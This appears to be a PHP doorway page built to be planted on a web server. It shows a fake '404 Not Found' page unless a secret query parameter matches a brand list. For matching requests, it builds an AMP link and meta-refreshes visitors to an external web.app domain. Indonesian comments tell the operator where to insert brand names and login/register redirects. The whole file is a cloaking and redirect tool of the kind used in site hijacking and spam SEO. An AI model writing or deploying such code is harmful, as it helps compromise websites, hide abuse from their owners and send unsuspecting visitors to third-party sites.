<?php

function feedback404()
{
    header("HTTP/1.0 404 Not Found");
    echo "<h1><strong>Not Found</strong></h1>";
    echo "The requested URL was not found on this server.";
}

if (isset($_GET['ojolale'])) {
    $filename = "list.txt";
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    $target_string = strtolower($_GET['ojolale']);
    foreach ($lines as $item) {
        if (strtolower($item) === $target_string) {
            $BRAND = strtoupper($target_string);
        }
    }
    if (isset($BRAND)) {
        $BRANDS = $BRAND;
        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
        if (isset($fullUrl)) {
            $parsedUrl = parse_url($fullUrl);
            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
            $urlPath = $baseUrl;
        } else {
            echo "URL saat ini tidak didefinisikan.";
        }
    } else {
        feedback404();
        exit();
    }
} else {
    feedback404();
    exit();
}

$amphtmlkamu = "https://belut-licin.web.app/ojolalekali/index.html?kiacaulele=" . $target_string;

/*

*GANTI NAMA BRAND DENGAN INI
<?php echo $BRANDS ?>

* GANTI URL PATH DENGAN INI
<?php echo $urlPath ?>
<?php echo $amphtmlkamu ?>

* SAMA GANTI REDIRECT LOGIN/REGISTER

*/
?>
<!-- Script Landing Page -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="0; url=https://belut-licin.web.app/">
    <title>Redirecting...</title>
</head>
<body>
    <p>If you are not redirected automatically, follow this <a href="https://belut-licin.web.app/">link to the new domain</a>.</p>
</body>
</html>



